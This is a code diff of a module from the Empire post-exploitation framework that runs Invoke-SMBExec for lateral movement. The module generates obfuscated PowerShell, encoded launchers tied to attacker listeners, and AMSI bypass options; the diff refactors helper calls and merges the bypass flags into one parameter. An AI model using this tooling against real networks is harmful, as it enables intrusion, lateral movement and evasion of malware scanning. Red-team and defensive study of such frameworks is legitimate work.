@@ -2,6 +2,8 @@ from __future__ import print_function
 
 from builtins import str
 from builtins import object
+
+from empire.server.utils import data_util
 from empire.server.common import helpers
 from typing import Dict
 
@@ -13,8 +15,6 @@ class Module(object):
     def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
         # Set booleans to false by default
         obfuscate = False
-        amsi_bypass = False
-        amsi_bypass2 = False
 
         listener_name = params['Listener']
         command = params['Command']
@@ -29,10 +29,6 @@ class Module(object):
         if (params['Obfuscate']).lower() == 'true':
             obfuscate = True
         obfuscate_command = params['ObfuscateCommand']
-        if (params['AMSIBypass']).lower() == 'true':
-            amsi_bypass = True
-        if (params['AMSIBypass2']).lower() == 'true':
-            amsi_bypass2 = True
 
         # Only "Command" or "Listener" but not both
         if (listener_name == "" and command  == ""):
@@ -44,7 +40,7 @@ class Module(object):
 
         module_source = main_menu.installPath + "/data/module_source/lateral_movement/Invoke-SMBExec.ps1"
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
+            data_util.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
             module_source = module_source.replace("module_source", "obfuscated_module_source")
         try:
             f = open(module_source, 'r')
@@ -63,7 +59,10 @@ class Module(object):
 
         elif listener_name:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True, userAgent=user_agent, obfuscate=obfuscate, obfuscationCommand=obfuscate_command, proxy=proxy, proxyCreds=proxy_creds, AMSIBypass=amsi_bypass, AMSIBypass2=amsi_bypass2)
+            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
+                                                           userAgent=user_agent, obfuscate=obfuscate,
+                                                           obfuscationCommand=obfuscate_command, proxy=proxy,
+                                                           proxyCreds=proxy_creds, bypasses=params['Bypasses'])
 
             if launcher == "":
                 print(helpers.color("[!] Error in launcher generation."))
@@ -82,6 +81,6 @@ class Module(object):
         if obfuscate:
             script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
         script += script_end
-        script = helpers.keyword_obfuscation(script)
+        script = data_util.keyword_obfuscation(script)
 
         return script
